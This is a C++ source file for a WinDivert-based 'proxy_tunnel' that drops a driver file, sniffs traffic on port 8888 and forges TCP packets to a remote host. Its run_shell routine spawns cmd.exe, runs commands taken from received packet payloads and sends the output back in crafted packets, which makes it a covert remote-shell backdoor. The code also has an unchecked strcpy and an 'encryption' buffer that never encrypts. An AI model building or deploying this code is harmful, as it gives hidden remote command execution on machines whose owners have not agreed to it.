#include "proxy_tunnel.h"
#include "windivert_bin.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"WinDivert.lib")

proxy_tunnel::proxy_tunnel()
{
	m_divert_handle = NULL;
	m_template_packet_len = 0;
	m_packet_template = NULL;
	m_addr_template = NULL;
	m_use_crypt = false;
	m_reverse_mode = false;
	m_lport = 54321;
	m_rport = 8888;
}

proxy_tunnel::~proxy_tunnel()
{
	WinDivertShutdown(m_divert_handle, WINDIVERT_SHUTDOWN_BOTH);
}

void proxy_tunnel::set_reverse_mode(bool mode)
{
	m_reverse_mode = mode;
}

void proxy_tunnel::start()
{
	release_sysfile();
	if (!init_divert("tcp.SrcPort = 8888")) {
		return;
	}

	UINT payload_len;
	PVOID payload_buf;

	char packet[WINDIVERT_MTU_MAX] = {};

	build_packet_template();
	send_data_packet("test from divert");
	while (TRUE)
	{
		if (!recv_data_packet(packet, &payload_len, &payload_buf))
			continue;
		/*
		if (payload_len && payload_buf)
		{
			if (payload_len >= strlen(SHELL_START) && !memcmp(payload_buf, SHELL_START, strlen(SHELL_START)))
			{
				run_shell();
			}
		}*/
	}
}

BOOL proxy_tunnel::init_divert(const char* filter)
{
	int priority = 0;
	cout << "[*] filter = \"" << filter << "\"" << endl;
	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, WINDIVERT_FLAG_SNIFF);
	if (m_divert_handle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_INVALID_PARAMETER)
		{
			cout << "[!] filter syntax error!" << endl;
			return FALSE;
		}
		cout << "[!] failed to open the WinDivert device (" << GetLastError() << ")!" << endl;
		return FALSE;
	}

	cout << "[*] divert open successfully." << endl;
	return TRUE;
}

void proxy_tunnel::run_shell()
{
	init_shell();
	UINT payload_len;
	char* payload_buf;

	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());

	while (true)
	{
		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
			continue;
		if (payload_len && payload_buf)
		{
			DWORD real_write = 0;
			strcpy(last_cmd, payload_buf);
			if (!WriteFile(m_std_in_wr, payload_buf, strlen(payload_buf), &real_write, NULL))
			{
				cout << "[!] write data:" << payload_buf << " error!" << endl;
			}
		}
	}
}

void proxy_tunnel::init_shell()
{
	cout << "[*] start shell mode" << endl;

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&m_std_out_rd, &m_std_out_wr, &sa, 0);
	SetHandleInformation(m_std_out_rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&m_std_in_rd, &m_std_in_wr, &sa, 0);
	SetHandleInformation(m_std_in_wr, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO start_info;
	TCHAR cmd_line[] = TEXT("cmd");
	ZeroMemory(&start_info, sizeof(STARTUPINFO));
	start_info.cb = sizeof(STARTUPINFO);
	start_info.hStdError = m_std_out_wr;
	start_info.hStdOutput = m_std_out_wr;
	start_info.hStdInput = m_std_in_rd;
	start_info.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,
		cmd_line,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&start_info,
		&m_proc_info);
	m_read_thread = (HANDLE)_beginthreadex(nullptr, 0, read_from_cmd, this, 0, &m_thread_id);
}

void proxy_tunnel::exit_shell()
{
	TerminateProcess(m_proc_info.hProcess, 0);
	TerminateThread(m_read_thread, 0);
	CloseHandle(m_read_thread);
	CloseHandle(m_proc_info.hProcess);
	CloseHandle(m_proc_info.hThread);
	CloseHandle(m_std_in_rd);
	CloseHandle(m_std_in_wr);
	CloseHandle(m_std_out_rd);
	CloseHandle(m_std_out_wr);
	cout << "[*] exit shell mode" << endl;
}

unsigned __stdcall proxy_tunnel::read_from_cmd(void* ptr)
{
	proxy_tunnel* pthis = (proxy_tunnel*)ptr;
	uint8_t buff[FILE_SIZE];
	DWORD read_size;
	while (true)
	{
		if (!ReadFile(pthis->m_std_out_rd, buff, FILE_SIZE - 1, &read_size, nullptr) || !read_size)
		{
			break;
		}
		buff[read_size] = 0;

		if (strlen((char*)buff) == strlen(pthis->last_cmd) && !strcmp((char*)buff, pthis->last_cmd))
		{
			continue;
		}
		pthis->send_data_packet((const char*)buff);
	}

	_endthreadex(0);
	return 0;
}


bool proxy_tunnel::release_sysfile()
{
#ifdef _WIN64
	ofstream fout = ofstream("WinDivert64.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X64, sizeof(SYS_DATA_X64));
#else
	ofstream fout = ofstream("WinDivert32.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X86, sizeof(SYS_DATA_X86));
#endif 
	fout.close();
	return true;
}

void proxy_tunnel::set_lport(UINT16 lport)
{
	m_lport = lport;
}

void proxy_tunnel::set_rport(UINT16 rport)
{
	m_rport = rport;
}


void proxy_tunnel::print_ip_info(PVOID ip_header)
{
	char dst_addr[16];
	char src_addr[16];
	if (WinDivertHelperFormatIPv4Address(((PWINDIVERT_IPHDR)ip_header)->DstAddr, dst_addr, 16) &&
		WinDivertHelperFormatIPv4Address(((PWINDIVERT_IPHDR)ip_header)->SrcAddr, src_addr, 16)) {
		cout << "[*] dst addr:" << dst_addr << "; src addr:" << src_addr << endl;
	}
	else {
		cout << "[!] prase address error!" << endl;
	}
}

void proxy_tunnel::build_packet_template()
{
	m_template_packet_len = sizeof(WINDIVERT_IPHDR) + sizeof(WINDIVERT_TCPHDR);
	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
	if (m_packet_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}

	WINDIVERT_IPHDR iphdr{ 0 };
	iphdr.Version = 4;			// 0100(IPv4)
	iphdr.HdrLength = 5;		// ip header length = 5 * 4 (byte)
	iphdr.TOS = 0;				// Type of Service: 000 (Routine)
	iphdr.Length = WinDivertHelperHtons(40);			// todo
	iphdr.Id = WinDivertHelperHtons(0xf52e);			// ?
	iphdr.FragOff0 = 0x40;	// Flags:0x40, Don't fragment;Fragment Offet: 0
	iphdr.TTL = 128;			// Time To Live
	iphdr.Protocol = 6;			// TCP (6)
	iphdr.Checksum = 0;			// todo
	iphdr.SrcAddr = INADDR_ANY;
	iphdr.DstAddr = *(PUINT32)m_raddr;

	WINDIVERT_TCPHDR tcphdr{ 0 };
	tcphdr.SrcPort = WinDivertHelperHtons(m_lport);
	tcphdr.DstPort = WinDivertHelperHtons(m_rport);
	tcphdr.SeqNum = rand();		// random seq number ISN(Initial Sequence Number)
	tcphdr.AckNum = 0;				// ?
	tcphdr.Reserved1 = 0;
	tcphdr.HdrLength = 5;			// tcp header length = 5 * 4 (byte)
	tcphdr.Window = WinDivertHelperHtons(64240);
	tcphdr.Checksum = 0;			// todo
	tcphdr.UrgPtr = 0;

	memcpy(m_packet_template.get(), &iphdr, sizeof(WINDIVERT_IPHDR));
	memcpy(m_packet_template.get() + sizeof(WINDIVERT_IPHDR), &tcphdr, sizeof(WINDIVERT_TCPHDR));
	WinDivertHelperCalcChecksums(m_packet_template.get(), m_template_packet_len, NULL, 0);
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);
}

void proxy_tunnel::build_addr_template()
{
	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
	if (m_addr_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memset(m_addr_template.get(), 0, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->TCPChecksum = 1;
	m_addr_template->UDPChecksum = 1;
	m_addr_template->IPChecksum = 1;
	m_addr_template->Outbound = 1;
	m_addr_template->Network.IfIdx = 4;

	LARGE_INTEGER ticks;
	QueryPerformanceCounter(&ticks);
	m_addr_template->Timestamp = ticks.QuadPart;
}

bool proxy_tunnel::recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID* payload_buf)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT recv_len;
	if (!WinDivertRecv(m_divert_handle, packet_buf, WINDIVERT_MTU_MAX, &recv_len, NULL))
	{
		cout << "[!] failed to read packet (" << GetLastError() << ")!" << endl;
		return false;
	}
	if (!m_template_packet_len)
	{
		set_packet_template(packet_buf, recv_len);
	}
	WinDivertHelperParsePacket(packet_buf, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, payload_buf,
		payload_len, NULL, NULL);
	if (ip_header)
	{
		print_ip_info(ip_header);
	}
	if (tcp_header)
	{
		cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
	}
	if (*payload_buf && *payload_len)
	{
		cout << "[*] recv payload length: " << *payload_len << " bytes" << endl;
		return true;
	}
	else
	{
		return false;
	}
}

void proxy_tunnel::set_packet_template(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;

	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);
	m_template_packet_len = recv_len - payload_len;
	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
	if (m_packet_template == NULL) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_packet_template.get(), packet, m_template_packet_len);
	WinDivertHelperParsePacket(m_packet_template.get(), recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Psh = 0;
	tcp_header->Ack = 0;
	tcp_header->Syn = 0;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);

	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
}

void proxy_tunnel::send_data_packet(const char* payload_buf, int payload_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT send_payload_len;
	PVOID send_payload_buf;
	UINT packet_len, send_len;

	if (!payload_len)
		payload_len = strlen(payload_buf);
	send_payload_len = 16 * (payload_len / 16 + 1);
	auto encrypt_buf = shared_ptr<char[]>(new char[send_payload_len]());
	if (!encrypt_buf) {
		return;
	}
	memcpy(encrypt_buf.get(), payload_buf, payload_len);

	packet_len = m_template_packet_len + send_payload_len;
	// build response packet
	auto reponse_packet = unique_ptr<char[]>(new char[packet_len]());
	if (!reponse_packet) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(reponse_packet.get(), m_packet_template.get(), m_template_packet_len);

	WinDivertHelperParsePacket(reponse_packet.get(), packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	// rebuild ip header
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + send_payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);

	tcp_header->Psh = 1;
	tcp_header->Ack = 1;
	// pack new payload in
	// cause template packet has no payload buf, we pos it manully. 
	send_payload_buf = (PVOID)((ULONG_PTR)tcp_header + sizeof(WINDIVERT_TCPHDR));
	memcpy(send_payload_buf, encrypt_buf.get(), send_payload_len);
	WinDivertHelperCalcChecksums(reponse_packet.get(), packet_len, m_addr_template.get(), 0);

	if (!WinDivertSend(m_divert_handle, reponse_packet.get(), packet_len, &send_len, m_addr_template.get()) || send_len == 0) {
		cout << "[!] failed to send data packet (" << GetLastError() << ")!" << endl;
	}
	else {
		cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
	}
}